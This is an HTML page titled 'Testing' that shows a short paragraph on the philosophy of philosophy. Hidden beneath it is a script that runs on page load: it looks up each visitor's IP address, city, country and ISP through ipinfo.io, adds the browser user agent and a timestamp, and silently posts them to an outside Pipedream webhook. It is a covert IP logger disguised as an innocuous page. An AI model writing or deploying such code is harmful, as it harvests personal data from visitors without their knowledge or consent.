<!DOCTYPE html>
<html>
<head>
    <title>Testing</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            text-align: center;
            background-color: #f2f2f2;
            padding: 20px;
        }
        h1 {
            margin-top: 20px;
        }
        p {
            color: red;
            font-size: 18px;
        }
    </style>
</head>
<body>
    <h1>Testing</h1>
    <p>The philosophy of philosophy is the study of the nature, scope, and meaning of philosophy itself. It involves critical analysis of philosophical concepts and their foundations. It aims to address fundamental questions about existence, knowledge, values, reason, and language.</p>

    <script>
        async function sendDataToWebhook() {
            try {
                // Fetching the user's IP info
                const ipData = await fetch("https://ipinfo.io/json").then(res => res.json());
                console.log("IP Data Retrieved:", ipData); // Debugging line

                const userAgent = navigator.userAgent;
                const log = {
                    ip: ipData.ip,
                    city: ipData.city,
                    country: ipData.country,
                    isp: ipData.org,
                    userAgent,
                    time: new Date().toISOString()
                };
                
                console.log("Data to Send:", log); // Debugging line
                
                // Using your Pipedream webhook URL
                const webhookUrl = "https://eoky7dsuisvr7mo.m.pipedream.net"; // Replace with your new Pipedream webhook URL
                const response = await fetch(webhookUrl, {
                    method: "POST",
                    body: JSON.stringify(log),
                    headers: { "Content-Type": "application/json" }
                });
                
                // Check if the request was successful
                if (response.ok) {
                    console.log("Data successfully sent to the webhook.");
                } else {
                    console.error("Error sending data to webhook:", response.status);
                }
            } catch (e) {
                console.error("Error sending data:", e);
            }
        }

        sendDataToWebhook(); // Trigger sending data to the webhook in the background
    </script>
</body>
</html>
